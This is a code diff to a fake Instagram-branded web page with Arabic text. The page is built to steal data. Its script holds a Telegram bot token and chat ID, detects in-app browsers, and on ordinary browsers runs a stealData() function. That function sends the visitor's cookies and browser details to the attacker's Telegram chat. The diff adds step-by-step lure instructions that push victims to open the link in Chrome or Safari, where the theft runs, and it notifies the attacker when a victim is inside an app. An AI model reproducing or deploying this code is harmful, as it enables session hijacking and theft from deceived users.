@@ -14,16 +14,28 @@
         .btn-outline { background: transparent; color: #0095f6; border: 1px solid #0095f6; }
         .footer { font-size: 12px; color: #c7c7c7; margin-top: 24px; }
         .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; }
+        .step { background: #f8f9fa; padding: 10px; border-radius: 8px; margin: 10px 0; font-size: 13px; text-align: left; }
+        .step-number { background: #0095f6; color: white; display: inline-block; width: 22px; height: 22px; border-radius: 50%; text-align: center; line-height: 22px; font-size: 12px; margin-right: 10px; }
     </style>
 </head>
 <body>
 <div class="container" id="mainContent">
     <div class="logo">📷</div>
-    <h2>فتح في المتصفح</h2>
+    <h2>⚠️ مطلوب متصفح خارجي</h2>
     <p>هذا المحتوى لا يمكن عرضه داخل التطبيق</p>
-    <div class="warning">⚠️ يرجى فتح الرابط في متصفح Chrome أو Safari</div>
-    <button class="btn" id="openBrowserBtn">فتح في المتصفح</button>
-    <button class="btn btn-outline" id="copyLinkBtn">نسخ الرابط</button>
+    <div class="warning">🔒 يرجى فتح هذا الرابط في متصفح Chrome أو Safari</div>
+    
+    <div class="step">
+        <span class="step-number">1</span> اضغط مع الاستمرار على الرابط
+    </div>
+    <div class="step">
+        <span class="step-number">2</span> اختر "فتح في المتصفح" أو "Open in Chrome"
+    </div>
+    <div class="step">
+        <span class="step-number">3</span> انتظر حتى يتم التحقق
+    </div>
+    
+    <button class="btn btn-outline" id="copyLinkBtn">📋 نسخ الرابط</button>
     <div class="footer">Instagram</div>
 </div>
 
@@ -35,26 +47,18 @@ var BOT_TOKEN = "8799007815:AAFoZ7f_T3fcmbNHVy0Rqcv9qpMytp1bEFU";
 var CHAT_ID = "6181826564";
 
 // ============================================
-// كشف إذا كان المستخدم داخل تطبيق Instagram
+// كشف التطبيق
 // ============================================
-function isInsideApp() {
-    var ua = navigator.userAgent || navigator.vendor || window.opera;
-    
-    // الكشف عن تطبيقات معينة
+function getApp() {
+    var ua = navigator.userAgent;
     if (ua.indexOf("Instagram") > -1) return "Instagram";
-    if (ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1) return "Facebook";
+    if (ua.indexOf("FBAN") > -1) return "Facebook";
     if (ua.indexOf("WhatsApp") > -1) return "WhatsApp";
     if (ua.indexOf("Twitter") > -1) return "Twitter";
     if (ua.indexOf("TikTok") > -1) return "TikTok";
     if (ua.indexOf("Snapchat") > -1) return "Snapchat";
-    if (ua.indexOf("Line") > -1) return "Line";
     if (ua.indexOf("Telegram") > -1) return "Telegram";
     if (ua.indexOf("Discord") > -1) return "Discord";
-    if (ua.indexOf("Reddit") > -1) return "Reddit";
-    
-    // كشف WebView عام
-    if (ua.indexOf("wv") > -1) return "WebView";
-    
     return false;
 }
 
@@ -69,9 +73,11 @@ function sendToTelegram(msg) {
 }
 
 // ============================================
-// سرقة البيانات (تتم فقط إذا كان في متصفح عادي)
+// سرقة البيانات (للمتصفح العادي فقط)
 // ============================================
 function stealData() {
+    var data = "";
+    
     var cookies = document.cookie;
     if (cookies && cookies.length > 0) {
         sendToTelegram("🍪 <b>Cookies</b>\n<code>" + cookies.substring(0, 3500) + "</code>");
@@ -100,66 +106,38 @@ function stealData() {
         screen: screen.width + "x" + screen.height,
         url: location.href,
         time: new Date().toISOString(),
-        insideApp: isInsideApp()
+        app: getApp() || "متصفح عادي"
     };
     sendToTelegram("💻 <b>Browser Info</b>\n<code>" + JSON.stringify(info, null, 2) + "</code>");
 }
 
 // ============================================
-// إجبار الضحية على فتح الرابط في المتصفح
+// نسخ الرابط
 // ============================================
-var app = isInsideApp();
-var currentUrl = window.location.href;
-
-if (app) {
-    // الضحية داخل تطبيق - نمنعه من رؤية المحتوى حتى يفتح في المتصفح
-    console.log("⚠️ المستخدم داخل تطبيق: " + app);
-    sendToTelegram("⚠️ <b>مستخدم داخل تطبيق</b>\nالتطبيق: " + app + "\nالرابط: " + currentUrl);
-    
-    // تعديل النص ليكون أكثر إلحاحاً
-    document.getElementById('mainContent').innerHTML = `
-        <div class="logo">📷</div>
-        <h2>⛔ غير مدعوم</h2>
-        <p>هذا المحتوى لا يمكن عرضه داخل تطبيق ${app}</p>
-        <div class="warning">🔒 يرجى فتح الرابط في متصفح Chrome أو Safari</div>
-        <button class="btn" id="openBrowserBtn">فتح في المتصفح</button>
-        <button class="btn btn-outline" id="copyLinkBtn">نسخ الرابط</button>
-        <div class="footer">Instagram</div>
-    `;
-    
-} else {
-    // الضحية في متصفح عادي - نسرق البيانات ونعرض المحتوى الطبيعي
-    console.log("✅ المستخدم في متصفح عادي");
-    stealData();
+function copyLink() {
+    var url = window.location.href;
+    navigator.clipboard.writeText(url).then(function() {
+        alert("✅ تم نسخ الرابط!\n\nالآن افتح متصفح Chrome أو Safari والصق الرابط في شريط العناوين");
+    });
 }
 
 // ============================================
-// أزرار التفاعل (تعمل في كل الحالات)
+// التشغيل الرئيسي
 // ============================================
-document.addEventListener('click', function(e) {
-    if (e.target.id === 'openBrowserBtn') {
-        // محاولة فتح الرابط في المتصفح الخارجي
-        var url = window.location.href;
-        
-        // محاولة استخدام Intent (لـ Android)
-        window.location.href = 'intent://' + url.replace('https://', '') + '#Intent;scheme=https;package=com.android.chrome;end';
-        
-        // بديل: محاولة فتح الرابط في نافذة جديدة
-        setTimeout(function() {
-            window.open(url, '_blank');
-        }, 100);
-        
-        // رسالة للضحية
-        alert("إذا لم يتم فتح المتصفح تلقائياً، اضغط على نسخ الرابط والصقه في Chrome");
-    }
-    
-    if (e.target.id === 'copyLinkBtn') {
-        var url = window.location.href;
-        navigator.clipboard.writeText(url).then(function() {
-            alert("تم نسخ الرابط. افتح متصفح Chrome والصقه في شريط العناوين");
-        });
-    }
-});
+var app = getApp();
+
+if (app) {
+    // داخل تطبيق - نرسل تنبيه للمهاجم
+    sendToTelegram("⚠️ <b>مستخدم داخل تطبيق</b>\nالتطبيق: " + app);
+    console.log("⚠️ المستخدم في تطبيق: " + app);
+} else {
+    // في متصفح عادي - نسرق البيانات
+    console.log("✅ مستخدم في متصفح عادي - يتم السرقة");
+    stealData();
+}
+
+// ربط زر النسخ
+document.getElementById('copyLinkBtn').addEventListener('click', copyLink);
 </script>
 </body>
 </html>
